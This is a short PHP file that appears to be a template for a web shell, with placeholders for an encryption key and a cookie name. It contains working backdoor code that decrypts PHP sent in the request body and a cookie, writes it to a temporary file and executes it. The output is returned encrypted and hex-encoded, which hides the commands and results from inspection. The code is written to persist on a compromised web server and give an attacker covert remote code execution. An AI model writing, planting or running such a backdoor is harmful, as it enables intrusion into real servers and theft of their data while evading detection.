<?
function encrypt($key,$str){
	$isempty=empty($str)||@gzuncompress($str)==='';
	for($ii=0;$ii<strlen($key);$ii++){
		$str = chr(mt_rand()%256).$str;
	}
	for($ii=0,$result='',$current=0;$ii<strlen($str);$ii++){
		$current=ord($str[$ii])^@ord($key[$ii%strlen($key)])^$current;
		$result.=chr($current);
	}
	return (!$isempty)?$result:'';
}
function decrypt($key,$str){
	for($ii=0,$result='',$current=0;$ii<strlen($str);$ii++){
		$result.=chr(ord($str[$ii])^@ord($key[$ii%strlen($key)])^$current);
		$current=ord($str[$ii]);
	}
	return(!empty($str))?substr($result,strlen($key)):'';
}
function shell() {
	@ob_start();
	$key='{{key}}';
	$mod=@gzuncompress(decrypt($key,file_get_contents('php://input')));
	$cmd=@gzuncompress(decrypt($key,pack('H*',@$_COOKIE['{{action}}'])));
	$tmp=tempnam(null,null);
	file_put_contents($tmp,'<?php '.$mod.$cmd.' ?>');
	try{ include($tmp); }catch(Exception $e){}
	echo unpack('H*',encrypt($key,@gzcompress(@ob_get_clean(),9)))[1];
}
shell();
?>
